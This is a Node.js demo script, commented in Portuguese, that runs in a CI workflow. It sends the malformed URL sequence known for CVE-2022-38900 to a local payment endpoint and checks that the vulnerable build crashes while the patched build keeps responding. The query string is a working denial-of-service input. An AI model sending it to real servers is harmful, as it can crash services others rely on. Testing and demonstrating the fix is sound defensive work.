// Cliente de teste externo à aplicação. Ele envia a sequência malformada
// documentada para CVE-2022-38900 pela URL HTTP, como faria um cliente remoto.
// Use apenas contra o servidor local isolado criado pelo workflow.
const [scenario, baseUrl = "http://127.0.0.1:3000"] = process.argv.slice(2);

if (!["vulnerable", "fixed"].includes(scenario)) {
  console.error("Uso: node scripts/demo-attack.mjs <vulnerable|fixed> [base-url]");
  process.exit(2);
}

const target = `${baseUrl}/payment?reference=%ea%ba%5a%ba`;
// O timeout evita que o cliente fique preso se o servidor não responder.
const timeoutMs = 3_000;
const started = Date.now();
let response;
let failure;

try {
  // fetch representa a solicitação de um cliente externo; não importa o módulo
  // vulnerável nem chama a função internamente.
  response = await fetch(target, { signal: AbortSignal.timeout(timeoutMs) });
} catch (error) {
  failure = `${error.name}: ${error.message}`;
}

const elapsedMs = Date.now() - started;
const vulnerableExpectedFailure = scenario === "vulnerable";
// Vulnerável: espera-se conexão interrompida porque o processo caiu.
// Corrigido: espera-se uma resposta HTTP normal.
const observedFailure = Boolean(failure);
const passed = observedFailure === vulnerableExpectedFailure;
const body = response ? await response.text() : "";
const section = [
  `### Demonstração externa da CVE-2022-38900: ${scenario}`,
  "",
  `- Requisição enviada: \`GET /payment?reference=%ea%ba%5a%ba\`.`,
  `- Resultado: ${failure ? `conexão interrompida (${failure})` : `HTTP ${response.status} em ${elapsedMs} ms`}.`,
  `- Resposta: \`${body.slice(0, 300)}\``,
  `- Comportamento esperado: ${vulnerableExpectedFailure ? "o processo vulnerável encerra após a exceção" : "a versão corrigida trata a entrada e continua respondendo"}.`,
  `- Veredito: **${passed ? "COMPORTAMENTO ESPERADO" : "RESULTADO INESPERADO"}**.`,
  ""
].join("\n");

console.log(section);
if (process.env.GITHUB_STEP_SUMMARY) {
  const { appendFile } = await import("node:fs/promises");
  await appendFile(process.env.GITHUB_STEP_SUMMARY, section);
}

if (!passed) process.exitCode = 1;
